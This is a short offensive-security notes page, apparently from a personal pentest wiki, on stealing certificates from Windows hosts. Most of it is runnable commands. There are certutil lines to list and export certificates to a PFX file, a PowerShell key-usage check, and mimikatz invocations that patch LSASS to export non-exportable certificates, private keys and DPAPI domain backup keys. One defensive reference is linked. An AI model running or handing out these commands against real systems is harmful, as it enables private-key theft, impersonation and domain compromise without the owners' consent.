---
title: Certificate Theft
---

[[notes/mitre-attack/credential-access]] on [[notes/windows/index]] by exporting certificates.

List stored certificates.

~~~ bat
certutil.exe -store My
certutil.exe -user -store My
~~~

Export a certificate that is marked as exportable.
This can also be done via `certmgr.msc`.

~~~ bat
certutil.exe -p passw0rd -exportPFX My 31f5a395749a3fbe4833b2dcc53992f2 %cd%\cert.pfx
~~~

Get certificate key usage.

=== "PowerShell"
    ~~~ powershell
    (New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @('cert.pfx', 'passw0rd')).EnhancedKeyUsageList
    ~~~

=== "builtin"
    ~~~ bat
    certutil.exe -dump -v .\cert.pfx
    ~~~

As local admin export user and computer certificates even if they are not marked as exportable by patching LSASS.

=== "[[notes/tools/mimikatz]]"
    ~~~ bat
    .\mimikatz.exe privilege::debug crypto::capi "crypto::keys /export" exit
    .\mimikatz.exe crypto::capi privilege::debug crypto::cng "crypto::certificates /store:my /export" exit
    .\mimikatz.exe token::elevate crypto::capi privilege::debug crypto::cng "lsadump::backupkeys /system:%COMPUTERNAME% /export" "crypto::certificates /systemstore:local_machine /export" exit
    ~~~

Untested tools:

- [[notes/tools/dploot]]
- [[notes/tools/sharpdpapi]]

References:

- [Breaking the Chain: Defending Against Certificate Services Abuse](http://web.archive.org/web/20230326061554/https://www.splunk.com/en_us/blog/security/breaking-the-chain-defending-against-certificate-services-abuse.html)
